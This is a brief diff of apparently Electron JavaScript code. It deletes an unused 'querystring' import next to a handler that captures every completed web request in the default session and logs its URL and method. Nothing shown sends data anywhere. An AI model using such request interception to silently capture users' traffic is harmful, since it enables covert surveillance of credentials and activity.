@@ -914,8 +914,6 @@ const writeLog = (message) => {
     fs.appendFileSync(logFilePath, logMessage);
   };
 
-const querystring = require('querystring');
-
 session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
   writeLog(`🚩 [Request Captured] URL: ${details.url}`);
   writeLog(`🔍 [Method]: ${details.method}`);
